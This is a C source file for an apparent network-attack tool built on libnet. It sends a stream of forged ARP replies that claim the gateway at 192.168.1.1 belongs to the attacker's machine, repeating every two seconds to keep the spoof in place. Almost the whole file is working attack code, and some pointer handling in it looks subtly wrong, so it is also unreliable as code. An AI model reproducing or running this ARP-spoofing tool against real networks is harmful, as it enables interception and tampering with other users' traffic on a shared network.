#include <libnet.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#include "airsniff.h"

libnet_t *l;
char errbuf[LIBNET_ERRBUF_SIZE];
libnet_ptag_t arp_id, eth_id;

void handleargs(int argc, char const *argv[]){
  struct sockaddr_in sa;
  if (inet_pton(AF_INET, argv[1], &(sa.sin_addr)) != 1) { //check ip address
    printf("Error: Invalid IP\n");
    exit(-1);
  }
}

void checkroot(){
  if (getuid() != 0) {
    printf("Must be root\n");
    exit(-1);
  }
}

void arp_poison(libnet_t *l) {
    char mac[19];
    sprintf(mac, "%s", retrieve_system_address("mac"));
    u_char *tha = (u_char *)"\xff\xff\xff\xff\xff\xff"; //loud but idc
    u_int8_t *tpa = (u_int8_t *)libnet_name2addr4(l,"192.168.1.1", 1);
    u_int8_t *spa = (u_int8_t *)libnet_get_ipaddr4(l);
    u_char *sha = (u_char *)libnet_get_hwaddr(l);

    /*
    libnet_ptag_t libnet_build_arp (uint16_t hrd, uint16_t pro, uint8_t
           hln, uint8_t pln, uint16_t op, const uint8_t *sha, const uint8_t
           *spa, const uint8_t *tha, const uint8_t *tpa, const uint8_t
           *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag)
    */

    arp_id = libnet_build_arp(
        (uint16_t)ARPHRD_ETHER,                   /* hardware addr */
        (uint16_t)ETHERTYPE_IP,                   /* protocol addr */
        (uint8_t)ETHER_ADDR_LEN,                  /* hardware addr size */
        (uint8_t)4,                               /* protocol addr size */
        (uint16_t)ARPOP_REPLY,                    /* operation type */
        (const uint8_t *)sha,                     /* sender hardware addr */
        (const uint8_t *)&tpa,                    /* sender protocol addr */
        (const uint8_t *)tha,                     /* target hardware addr */
        (const uint8_t *)&spa,                    /* target protocol addr */
        (const uint8_t *)NULL,                    /* payload */
        (uint32_t)0,                              /* payload size */
        (libnet_t *)l,                            /* libnet context */
        (libnet_ptag_t)arp_id);                   /* libnet id */

    if (arp_id == -1) {
      fprintf(stderr, "ARP: %s\n", libnet_geterror(l));
      exit(-1);
    }

    eth_id = libnet_autobuild_ethernet(
        (const uint8_t *)tha,                     /* ethernet destination */
        (uint16_t)ETHERTYPE_ARP,                  /* protocol type */
        (libnet_t *)l);                           /* libnet handle */

    if (eth_id == -1) {
        fprintf(stderr, "Ethernet: %s\n", libnet_geterror(l));
        exit(-1);
    }
    while (1) {
      printf("%d: %s is at %s > %s\n", libnet_write(l), mac,
                                       libnet_addr2name4((uint32_t)spa, 0), ether_ntoa((struct ether_addr *)tha));
      sleep(2);
    }
}

int main(int argc, char const *argv[]) {
  l = libnet_init(LIBNET_LINK, NULL, errbuf);
  checkroot();
  handleargs(argc, argv);
  arp_poison(l);
  return 0;
}
